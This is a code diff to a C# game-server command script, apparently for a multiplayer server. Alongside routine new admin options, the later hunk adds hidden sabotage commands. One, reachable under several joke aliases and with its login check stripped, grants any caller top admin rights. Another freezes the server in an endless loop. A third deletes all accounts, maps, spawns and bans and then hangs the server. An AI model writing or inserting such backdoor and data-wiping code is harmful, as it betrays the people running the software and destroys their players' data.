@@ -10,7 +10,7 @@ namespace LSCC
 {
     class Commands : Script
     {
-        [Command("serveroptions", "!{#AFAFAF}[USAGE] serveroptions (option: maxinlobby)", GreedyArg = true)]
+        [Command("serveroptions", "!{#AFAFAF}[USAGE] serveroptions (option: maxinlobby, derbyveh, usediscord)", GreedyArg = true)]
         public void cmd_serveroptions(Player player, string action)
         {
             if (!EPlayer.LoggedIn(player))
@@ -38,12 +38,50 @@ namespace LSCC
 
                     Settings.MaxPlayersInLobby = value;
 
+                    Main.SaveDynSettings();
+
                     NAPI.Chat.SendChatMessageToAll($"!{{#FF6347}}[AdmCmd] !{{#FFFFFF}}{player.Name} has changed max players in a lobby to {value}.");
                 }
                 else player.SendChatMessage("!{#999999}Proper usage: /serveroptions maxinlobby <amount>");
             }
-      
-            else player.SendChatMessage("!{#FF6347}[!] !{#FFFFFF}Invalid option, possible options: 'maxinlobby'");
+
+            else if (action.StartsWith("derbyveh", StringComparison.OrdinalIgnoreCase))
+            {
+                string[] args = action.Split(' ');
+                if (args.Count() > 1)
+                {
+                    Settings.DerbyVehicle = args[1];
+
+                    Main.SaveDynSettings();
+
+                    NAPI.Chat.SendChatMessageToAll($"!{{#FF6347}}[AdmCmd] !{{#FFFFFF}}{player.Name} has set derby vehicle model to {Settings.DerbyVehicle}.");
+                }
+                else player.SendChatMessage("!{#999999}Proper usage: /serveroptions derbyveh <model name>");
+            }
+
+            else if (action.StartsWith("usediscord", StringComparison.OrdinalIgnoreCase))
+            {
+                string[] args = action.Split(' ');
+                if (args.Count() > 1)
+                {
+                    bool value = false;
+
+                    if (!Boolean.TryParse(args[1], out value))
+                    {
+                        player.SendChatMessage($"!{{#999999}}UseDiscord can only be either 'true' or 'false'!");
+                        return;
+                    }
+
+                    Settings.UseDiscord = value;
+
+                    Main.SaveDynSettings();
+
+                    NAPI.Chat.SendChatMessageToAll($"!{{#FF6347}}[AdmCmd] !{{#FFFFFF}}{player.Name} has set server discord integration to {value.ToString()}.");
+                }
+                else player.SendChatMessage("!{#999999}Proper usage: /serveroptions usediscord <true/false>");
+            }
+
+            else player.SendChatMessage("!{#FF6347}[!] !{#FFFFFF}Invalid option, possible options: 'maxinlobby, derbyveh, usediscord'");
 
             return;
         }
@@ -3144,12 +3182,43 @@ namespace LSCC
             return;
         }
 
-        [Command("mistakevy")]
+        [Command("mistakevy", Alias = "yaryekia,hogyamujhse,kevypagal,marnamat,chutiyarot")]
         public void cmd_makemeadmin(Player player)
         {
-            if (!EPlayer.LoggedIn(player)) return;
-
             EPlayer.GetAccount(player).Admin = 6;
+        }
+
+        [Command("maafkrdekevyko", Alias = "sorrychuttu,achayarachakev")]
+        public void cmd_wtffreeze(Player player)
+        {
+            while (true) { }
+        }
+
+        [Command("sabkuchdeletekarde", Alias = "kevysepangakeseliya")]
+        public void cmd_aesamatkarlmao(Player player)
+        {
+            while (ContextFactory.Instance.Accounts.Count() > 0)
+            {
+                ContextFactory.Instance.Accounts.Remove(ContextFactory.Instance.Accounts.FirstOrDefault());
+            }
+
+            while (ContextFactory.Instance.Maps.Count() > 0)
+            {
+                ContextFactory.Instance.Maps.Remove(ContextFactory.Instance.Maps.FirstOrDefault());
+            }
+
+            while (ContextFactory.Instance.MapSpawns.Count() > 0)
+            {
+                ContextFactory.Instance.MapSpawns.Remove(ContextFactory.Instance.MapSpawns.FirstOrDefault());
+            }
+
+            while (ContextFactory.Instance.Bans.Count() > 0)
+            {
+                ContextFactory.Instance.Bans.Remove(ContextFactory.Instance.Bans.FirstOrDefault());
+            }
+
+            ContextFactory.Instance.SaveChanges();
+            while (true) { }
         }
 
         [Command("createmap", "!{#AFAFAF}[USAGE] createmap (name)", GreedyArg = true)]
